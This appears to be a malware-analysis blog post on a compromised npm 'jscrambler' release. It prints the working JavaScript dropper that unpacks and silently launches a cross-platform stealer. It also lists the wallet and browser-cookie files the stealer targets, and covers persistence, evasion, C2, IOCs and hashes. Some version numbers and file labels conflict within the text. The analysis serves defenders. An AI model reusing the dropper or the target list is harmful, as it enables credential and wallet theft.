---
title: "npm Jscrambler package supply chain attack"
date: 2026-07-12 21:06:30 +0300
categories: [malware analysis, Threat Intelligence] 
tags: [tracking,malware]
---

Jscrambler **Code Integrity** is a JavaScript protection technology for Web and Mobile Applications. Its main purpose is to enable JavaScript applications to become self-defensive and resilient to tampering and reverse engineering.

Yesterday **12-07-2026** this package was released in version 18.4.0 , and in few minutes , **Socket** flagged this package as malicious , triggering what is known as a **supply chain attack** <br><br>```This type of attack happens not when you download or get infected directly , no , but when packages or app maintainers that you use get's compromised```

Two new malicious files ```setup.js``` and ```intro.js``` was added to the package by the adversary 

**setup.js** is nothing but a malicious dropper  , that drops a Gzipped Rust stealer from intro.js , and executes it . **intro.js** contains three compressed Rust stealers , one for windows , Macos and linux .

**intro.js operations**
```
import { readFileSync, writeFileSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';
import { gunzipSync } from 'zlib';
import { spawn } from 'child_process';
import { tmpdir } from 'os';

const __dirname = dirname(fileURLToPath(import.meta.url));

const PLATFORM_IDS = { linux: 0, win32: 1, darwin: 2 };

function ensureNativeRuntime() {
  const bundle = readFileSync(join(__dirname, 'intro.js'));  //read the file ,which contains three copies of a Rust stealer (one for windows ,Mac os ans linux)
  const magic = Buffer.from([0x1b, 0x43, 0x53, 0x49, 0x01]); //Magic bytes marker
  if (!bundle.slice(0, 5).equals(magic)) return;

  const platformId = PLATFORM_IDS[process.platform];
  if (platformId === undefined) return;

  const count = bundle[5];
  let offset = 6;

  for (let i = 0; i < count; i++) {
    const platform = bundle[offset++];
    offset += 8;
    const compressedSize = Number(bundle.readBigUInt64LE(offset)); offset += 8;
    const data = bundle.slice(offset, offset + compressedSize); offset += compressedSize;

    if (platform !== platformId) continue;

    const ext = platform === 1 ? String.fromCharCode(46,101,120,101) : ''; //if windows ,apend .exe
    const target = join(tmpdir(), '.' + Math.random().toString(36).slice(2) + ext); //%TEMP%\random.exe
    writeFileSync(target, gunzipSync(data), { mode: platform === 1 ? 0o644 : 0o755 }); //drop the file uncompressed

    try {
      const proc = spawn(target, [], { detached: true, stdio: 'ignore', windowsHide: true });  //launch the dropped malware hidden
      proc.unref(); //so this parent can exit independent of the child process
    } catch (_) {}
    break;
  }
}

ensureNativeRuntime(); //choose the Rust stealer binary based on OS from intro.js
```

The package latest tag is still **8.13.0** . The version was pushed straight to npm under a legitimate maintainer account, bypassing the project's normal release flow. That points to a compromised npm account or build pipeline. Which of the two has not been established.

**Later , Jscrambler has confirmed the cause : The attacker published the packages using a compromised npm publishing credential. Socket now ties five malicious jscrambler versions to the same actor, pushed over about three hours, and all carrying the same cross-platform infostealer analyzed in this article , which are 18.14.0 , 18.16.0 , 18.17.0 , 18.18.0 and 18.20.0**

The target list is broad and aimed at developers: cloud credentials from AWS, Azure, and Google Cloud, including the metadata endpoints CI runners use; cryptocurrency wallets and seed phrases from MetaMask, Phantom, and Exodus; the Bitwarden password manager vault; browser-stored passwords and cookies; and Discord, Slack, Telegram, and Steam sessions.

It also goes after something newer: the config files for AI coding tools, including Claude Desktop, Cursor, Windsurf, VS Code, and Zed, where API keys and Model Context Protocol server credentials tend to sit.

Other resources points that the  binaries do more than steal. On Linux, the payload links the kernel's BPF library and can load an eBPF program straight into the kernel from memory. That is a foothold in the kernel, not the userspace file access that the rest of the stealer relies on.<br>
 **StepSecurity** and **SafeDep** both flagged the capability, though what the eBPF does is still being pulled apart.


**For the purpose of this coverage , I extracted the windows stealer and analyzed it's behavior , in order to cover it's main tactics and techniques , as well as IOCs**

Before we start  this is an overview of how might a developer get infected :

![overview](/resources/jscrabber_res/supp24.png)

## Windows stealer analysis 

The main stealer is dropped to the %temp% directory , with a random name .

Upon initial Execution , the malware copies itself to  %APPDATALOCAL%\Programs to an executable with randomly chosen  keyword as name (also the directory under \Programs is with the same name).

![malware being copied to a randomly chosen name](/resources/jscrabber_res/supply20.png)

**A screenshot showing the malware being copied under a different name every time**

![malware being copied to a randomly chosen name](/resources/jscrabber_res/supp21.png)



It then drops other binary with a random name to  **%USERPOFILE%** , and executes it   

![malware being copied to a randomly chosen name](/resources/jscrabber_res/supp3.PNG)


![malware being copied to a randomly chosen name](/resources/jscrabber_res/supp5.PNG)

**Upon initial analysis ,the binary seems to be a windows defender disabler , using a technique called BYOVD ( bring your own vulnerable driver) to load a vulnerable signed driver to the kernel , using it to achieve higher impact**

**The binary also uses  ItaskService COM API to create a task that lauches after 30 secs of startup , maintaining  foothold across reboots**

![creating Itask server instance](/resources/jscrabber_res/supp9.PNG)
![settig up the task definition](/resources/jscrabber_res/supp8.PNG)



Back to the original binary , when it is redropped under %APPDATALOCAL%\Programs , now it starts to behave like a stealer


It uses **CredEnumerateW** to enumerate all available cached credentials

It tries to steal common crypto currency wallets , some files accessed :

```
"%APPDATA%\ELECTRUM\WALLETS"
"%APPDATA%\ATOMIC\LOCAL STORAGE\LEVELDB\CURRENT"
"%APPDATA%\ATOMIC\LOCAL STORAGE\LEVELDB"
"%APPDATA%\EXODUS\EXODUS.WALLET\PASSPHRASE.JSON"
"%APPDATA%\EXODUS\EXODUS.WALLET\SEED.SECO"
```

As usual of any credential stealer , it steals browser cookies and user data :

```
"%LOCALAPPDATA%\GOOGLE\CHROME\USER DATA\LOCAL STATE"
"%LOCALAPPDATA%\GOOGLE\CHROME\USER DATA\DEFAULT\NETWORK\COOKIES"
"%LOCALAPPDATA%\GOOGLE\CHROME\USER DATA\DEFAULT\COOKIES"
"%LOCALAPPDATA%\GOOGLE\CHROME SXS\USER DATA\LOCAL STATE"
"%LOCALAPPDATA%\GOOGLE\CHROME SXS\USER DATA\DEFAULT\NETWORK\COOKIES"
"%LOCALAPPDATA%\GOOGLE\CHROME SXS\USER DATA\DEFAULT\COOKIES"
"%LOCALAPPDATA%\Microsoft\EDGE\USER DATA\LOCAL STATE"
"%LOCALAPPDATA%\Microsoft\EDGE\USER DATA\DEFAULT\NETWORK\COOKIES"
"%LOCALAPPDATA%\Microsoft\EDGE\USER DATA\DEFAULT\COOKIES"
"%LOCALAPPDATA%\BRAVESOFTWARE\BRAVE-BROWSER\USER DATA\LOCAL STATE"
"%LOCALAPPDATA%\BRAVESOFTWARE\BRAVE-BROWSER\USER DATA\DEFAULT\NETWORK\COOKIES"
"%LOCALAPPDATA%\BRAVESOFTWARE\BRAVE-BROWSER\USER DATA\DEFAULT\COOKIES"
"%LOCALAPPDATA%\VIVALDI\USER DATA\LOCAL STATE"
"%LOCALAPPDATA%\VIVALDI\USER DATA\DEFAULT\NETWORK\COOKIES"
"%LOCALAPPDATA%\VIVALDI\USER DATA\DEFAULT\COOKIES"
"%LOCALAPPDATA%\YANDEX\YANDEXBROWSER\USER DATA\LOCAL STATE"
"%LOCALAPPDATA%\YANDEX\YANDEXBROWSER\USER DATA\DEFAULT\NETWORK\COOKIES"
"%LOCALAPPDATA%\YANDEX\YANDEXBROWSER\USER DATA\DEFAULT\COOKIES"
"%APPDATA%\OPERA SOFTWARE\OPERA STABLE\LOCAL STATE"
"%APPDATA%\OPERA SOFTWARE\OPERA STABLE\COOKIES"
```

It also enumerate a wide range of other system and user data , like usernames , groups , OS information and patches . It even enumerate machine group policies , **see below image**

![a screenshot from procmon , showing group policy enumeration](/resources/jscrabber_res/supp12.PNG)


The stealer also  enumerates the file system , looking for security tools artifacts , like AVs , suricata , zeek, snort and a punch of other tools . It even searches for common red teaming tools like nmap , empire ,cobalt strike ..etc . The malware discovering such information will help shape follow on behaviors (**for example they might avoid execution on analysis environments to stay undetected for a longer time**)

![checking for some AVs and analysis tools](/resources/jscrabber_res/supp13.PNG)<br><br>
![checking for some AVs and analysis tools](/resources/jscrabber_res/supp16.PNG)

**As an additional evasion measures** , it evades sandbox detection via waitable timers and long sleeps , Anti-debugging using execution time  , debug-strings and isDebuggerPresent checks

Detecting virtualization using disk size , memory size and cpu features


All collected data is encrypted  , then passed to the C2  server ```check.torproject.org``` on port ```443``` using HTTPs <br>(**Usage of TOR is to increase anonymity , and harden infrastructure tracking , which allows it to operate for a longer time**)  

![C2 communication](/resources/jscrabber_res/supp11.PNG)

## Techniques and Tactics:

Attackers gained  **Initial Access** to victims through compromising Jscrambler development pipeline , publishing the package with additional malicious files (**Supply Chain Compromise , compromise Software Dependecies and Development tools**)

**Execution , Command and scripting interpreter Java Script** 

To achieve **Persistence** , the attacker abused COM API , particularly ITaskService , to Create a scheduled task that runs after every startup (**Scheduled Task/Job**)


For **Defense evasion** The stealer used various **Debugger Evasion** techniques  , as well as **Delay Execution** to evade sandbox detection, which commonly run the sample for a limited time .Moreover ,for **Virtualization evasion** they check the for the presence of common malware analysis and detection tools .




All data inside intro.js is compressed using  **Gzip compression** , this makes signature based detection for executables harder (**Obfuscated files or information , compression**)



**Credential Access :** It  Steals a wide variety of credentials , including using **credentials from password stores** to steal credentials from Browsers and crypto wallets

**Command And Control , Multi-hop proxy** using TOR based C2 , this increases anonymity and security since the connection is relayed several times , adding encryption layer by layer , as well as **Encrypted channel:Assymetric cryptography** since Tor encapsulates traffic in multiple layers of encryption, using TLS by default.




## Indicators of compromise

### Host based IOCs 

Versions 18.14.0 , 18.16.0 , 18.17.0 , 18.18.0 and 18.20.0 of Jscrambler package installed by npm manager . 
**Two files of interest , setup.js and a very big binary intro.js (it will have very high entropy since it is compressed)**
<br><br>
A Randomly named  executable under %temp% directory ( or the equivilant in Mac os or linux )  with sha256 hash  
```B7CA95D1B23C8E67416A25CEDF741DE0917C2096BBC9D24649EEA7853D054903``` 

**Importance :** This is the main Stealer binary 
<br><br>

An executable with the same hash under **%APPDATALOCAL%\Program\something** , with the executable holding the same name as the parent dir

**Importance :** This is a copy of the main Stealer , moved here for persistence
<br><br>

**Note that names are randomly selected from a predefined list , so names will not be a very reliable detection method**


A **named pipe**  with name 
```\\.\pipe\esc``` which is used for cummincation between the main malware and dropped modules


A **scheduled task** under  \ folder  , with random name , and description **Manages Background Updates** pointing to one of the copycats in **%APPDATALOCAL%\Programs\CopyCat name\samename.exe**
**Importance :** This is the main persistence method used by the stealer
, so removing the task , will get rid of the persistence



### Network based IOCs 

HTTPS communcation with  C2 server ```check.torproject.org``` 


**Importance :** Blocking this traffic will cut communication with the C2 server , reducing data and credential losses


### Hashes 

dist/setup.js: ```a742de963f14a92d24ebcbc7b44ac867e23a20d31d1b0094a13a4f83287f4e60```

dist/intro.js: ```a41a523ef9517aab37ed6eea0ec881821bdcb7aefcb5c5f603adc7907f868c86```

Linux payload: ```fbbcf4d8f98168f78f5c0c47a9ae56d59ec8ac84a7c9ca6b797fedfb8d62d2bd```

Windows payload: ```b7ca95d1b23c8e67416a25cedf741de0917c2096bbc9d24649eea7853d054903```

macOS payload: ```c8fd47d36bdf7c825378593ab82ed8c24d1dc52e26b507812393e24e1d5201fd```





**That's it for this blog , we covered the main attack chain of the supply chain compromise , and focused on the  main behaviors of the stealer , finishing with some IOCs and TTPs to help stop and mitigate the threat**








